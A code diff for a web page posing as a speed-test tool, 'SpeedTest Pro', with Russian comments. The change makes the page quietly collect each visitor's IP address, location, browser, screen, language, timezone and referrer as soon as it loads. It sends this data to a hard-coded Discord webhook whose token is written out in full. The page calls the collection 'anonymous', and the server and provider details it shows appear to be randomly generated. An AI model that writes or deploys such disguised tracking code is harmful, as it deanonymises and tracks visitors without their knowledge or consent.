@@ -299,10 +299,10 @@
     </div>
 
     <script>
-        // ВАШ DISCORD WEBHOOK URL - замените этот пример на ваш реальный URL
+        // ВАШ DISCORD WEBHOOK URL
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1462784316047360122/BiCpoNbvNSOPFUrsUBV0Kia-OldT7Vy67Zy5yrPrhBpbizOXQY1pBAYj_gBNpLFOAU9i';
-        
-        // Массив резервных API для определения IP (если один не сработает)
+
+        // Массив резервных API для определения IP
         const IP_APIS = [
             'https://api.ipify.org?format=json',
             'https://api.my-ip.io/ip.json',
@@ -314,6 +314,7 @@
         let testInProgress = false;
         let userIP = 'Не определен';
         let userLocation = 'Не определено';
+        let ipSent = false; // Флаг, чтобы не отправлять IP несколько раз
 
         // Функция для получения IP с резервными API
         async function getUserIP() {
@@ -326,13 +327,12 @@
                         headers: {
                             'Accept': 'application/json'
                         },
-                        signal: AbortSignal.timeout(5000) // Таймаут 5 секунд
+                        signal: AbortSignal.timeout(5000)
                     });
-                    
+
                     if (response.ok) {
                         const data = await response.json();
-                        console.log('Успешный ответ:', data);
-                        
+
                         // Извлекаем IP из разных форматов ответов
                         if (data.ip) {
                             userIP = data.ip;
@@ -341,14 +341,14 @@
                         } else if (typeof data === 'string') {
                             userIP = data;
                         }
-                        
+
                         // Извлекаем локацию
                         if (data.country || data.city) {
                             userLocation = `${data.city || ''}${data.city && data.country ? ', ' : ''}${data.country || ''}`;
                         } else if (data.country_name) {
                             userLocation = `${data.city || ''}${data.city && data.country_name ? ', ' : ''}${data.country_name || ''}`;
                         }
-                        
+
                         if (userIP && userIP !== 'Не определен') {
                             console.log(`IP найден: ${userIP}`);
                             return true;
@@ -362,71 +362,134 @@
             return false;
         }
 
-        // Функция для отправки данных в Discord
-        async function sendToDiscord(downloadSpeed, uploadSpeed, ping) {
-            if (!WEBHOOK_URL.includes('ВАШ_WEBHOOK_ID')) {
-                try {
-                    // Получаем дополнительную информацию
-                    const browserInfo = navigator.userAgent;
-                    const screenResolution = `${window.screen.width}x${window.screen.height}`;
-                    const language = navigator.language;
-                    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-                    const referrer = document.referrer || 'Прямой заход';
-                    
-                    // Формируем embed сообщение
-                    const message = {
-                        content: `📊 **Новая проверка скорости**`,
-                        embeds: [{
-                            title: "SpeedTest Pro - Результаты",
-                            color: 0x5865F2,
-                            fields: [
-                                {
-                                    name: "📡 Соединение",
-                                    value: `**Сервер:** ${getRandomServer()}\n**Провайдер:** ${getRandomISP()}`,
-                                    inline: true
-                                },
-                                {
-                                    name: "⚡ Скорость",
-                                    value: `**↓ Скачивание:** ${downloadSpeed} Мбит/с\n**↑ Отправка:** ${uploadSpeed} Мбит/с\n**⏱️ Пинг:** ${ping} мс`,
-                                    inline: true
-                                },
-                                {
-                                    name: "🌍 Локация",
-                                    value: `**Регион:** ${userLocation}\n**IP:** ||${userIP}||`,
-                                    inline: false
-                                },
-                                {
-                                    name: "🖥️ Устройство",
-                                    value: `**Разрешение:** ${screenResolution}\n**Язык:** ${language}\n**Временная зона:** ${timezone}`,
-                                    inline: false
-                                },
-                                {
-                                    name: "📊 Статистика",
-                                    value: `**Источник:** ${referrer}\n**Время:** ${new Date().toLocaleString('ru-RU')}\n**ID сессии:** ${generateSessionId()}`,
-                                    inline: false
-                                }
-                            ],
-                            footer: {
-                                text: "SpeedTest Pro • Анонимная метрика",
-                                icon_url: "https://cdn.discordapp.com/attachments/1063271001708892160/1063271001708892160/tachometer.png"
+        // Функция для отправки IP в Discord (при заходе на сайт)
+        async function sendIPOnEntry() {
+            if (ipSent) return; // Не отправляем повторно
+            
+            const ipFound = await getUserIP();
+            if (!ipFound) {
+                console.log('Не удалось определить IP');
+                return;
+            }
+            
+            try {
+                // Получаем дополнительную информацию
+                const browserInfo = navigator.userAgent;
+                const screenResolution = `${window.screen.width}x${window.screen.height}`;
+                const language = navigator.language;
+                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                const referrer = document.referrer || 'Прямой заход';
+                
+                // Формируем сообщение для Discord
+                const message = {
+                    content: `🌐 **Новый посетитель на SpeedTest Pro**`,
+                    embeds: [{
+                        title: "Информация о посетителе",
+                        color: 0x5865F2,
+                        fields: [
+                            {
+                                name: "🌍 Локация",
+                                value: `**Регион:** ${userLocation}\n**IP:** ||${userIP}||`,
+                                inline: false
+                            },
+                            {
+                                name: "🖥️ Устройство",
+                                value: `**Разрешение:** ${screenResolution}\n**Браузер:** ${browserInfo.substring(0, 80)}...\n**Язык:** ${language}`,
+                                inline: false
+                            },
+                            {
+                                name: "📊 Детали",
+                                value: `**Время:** ${new Date().toLocaleString('ru-RU')}\n**Источник:** ${referrer}\n**Временная зона:** ${timezone}`,
+                                inline: false
                             }
-                        }]
-                    };
+                        ],
+                        footer: {
+                            text: "SpeedTest Pro • Автоматический отчет",
+                            icon_url: "https://cdn.discordapp.com/attachments/1063271001708892160/1063271001708892160/tachometer.png"
+                        }
+                    }]
+                };
 
-                    const response = await fetch(WEBHOOK_URL, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify(message)
-                    });
+                const response = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(message)
+                });
 
-                    if (response.ok) {
-                        console.log('Данные отправлены в Discord');
-                    }
-                } catch (error) {
-                    console.error('Ошибка отправки в Discord:', error);
+                if (response.ok) {
+                    console.log('IP отправлен в Discord при заходе на сайт');
+                    ipSent = true; // Устанавливаем флаг, что IP отправлен
                 }
+            } catch (error) {
+                console.error('Ошибка отправки IP в Discord:', error);
+            }
+        }
+
+        // Функция для отправки данных в Discord (при тесте скорости)
+        async function sendToDiscord(downloadSpeed, uploadSpeed, ping) {
+            try {
+                // Получаем дополнительную информацию
+                const browserInfo = navigator.userAgent;
+                const screenResolution = `${window.screen.width}x${window.screen.height}`;
+                const language = navigator.language;
+                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                const referrer = document.referrer || 'Прямой заход';
+                
+                // Формируем embed сообщение
+                const message = {
+                    content: `📊 **Новая проверка скорости**`,
+                    embeds: [{
+                        title: "SpeedTest Pro - Результаты",
+                        color: 0x5865F2,
+                        fields: [
+                            {
+                                name: "📡 Соединение",
+                                value: `**Сервер:** ${getRandomServer()}\n**Провайдер:** ${getRandomISP()}`,
+                                inline: true
+                            },
+                            {
+                                name: "⚡ Скорость",
+                                value: `**↓ Скачивание:** ${downloadSpeed} Мбит/с\n**↑ Отправка:** ${uploadSpeed} Мбит/с\n**⏱️ Пинг:** ${ping} мс`,
+                                inline: true
+                            },
+                            {
+                                name: "🌍 Локация",
+                                value: `**Регион:** ${userLocation}\n**IP:** ||${userIP}||`,
+                                inline: false
+                            },
+                            {
+                                name: "🖥️ Устройство",
+                                value: `**Разрешение:** ${screenResolution}\n**Язык:** ${language}\n**Временная зона:** ${timezone}`,
+                                inline: false
+                            },
+                            {
+                                name: "📊 Статистика",
+                                value: `**Источник:** ${referrer}\n**Время:** ${new Date().toLocaleString('ru-RU')}\n**ID сессии:** ${generateSessionId()}`,
+                                inline: false
+                            }
+                        ],
+                        footer: {
+                            text: "SpeedTest Pro • Анонимная метрика",
+                            icon_url: "https://cdn.discordapp.com/attachments/1063271001708892160/1063271001708892160/tachometer.png"
+                        }
+                    }]
+                };
+
+                const response = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(message)
+                });
+
+                if (response.ok) {
+                    console.log('Данные отправлены в Discord');
+                }
+            } catch (error) {
+                console.error('Ошибка отправки в Discord:', error);
             }
         }
 
@@ -463,14 +526,14 @@
             resultsDiv.style.display = 'none';
             
             try {
-                // Этап 1: Получение IP и информации
-                progressFill.style.width = '20%';
-                progressText.textContent = 'Определение местоположения...';
-                
-                const ipFound = await getUserIP();
-                if (!ipFound) {
-                    userIP = 'Не удалось определить';
-                    userLocation = 'Неизвестно';
+                // Этап 1: Получение IP (если еще не получен)
+                if (!ipSent) {
+                    progressFill.style.width = '20%';
+                    progressText.textContent = 'Определение местоположения...';
+                    await getUserIP();
+                } else {
+                    progressFill.style.width = '20%';
+                    progressText.textContent = 'Подготовка теста...';
                 }
                 
                 // Этап 2: Тест пинга
@@ -595,20 +658,17 @@
         // Инициализация
         document.getElementById('startTest').addEventListener('click', startSpeedTest);
         
-        // Показываем историю при загрузке
+        // Автоматически отправляем IP при загрузке страницы
         window.addEventListener('load', () => {
+            console.log('Страница загружена, отправляем IP...');
+            sendIPOnEntry();
+            
+            // Показываем историю
             updateHistoryDisplay();
             const history = JSON.parse(localStorage.getItem('speedTestHistory') || '[]');
             if (history.length > 0) {
                 document.getElementById('history').style.display = 'block';
             }
-            
-            // Автоматически получаем IP при загрузке (не показывая пользователю)
-            getUserIP().then(success => {
-                if (success) {
-                    console.log('IP автоматически получен:', userIP);
-                }
-            });
         });
     </script>
 </body>
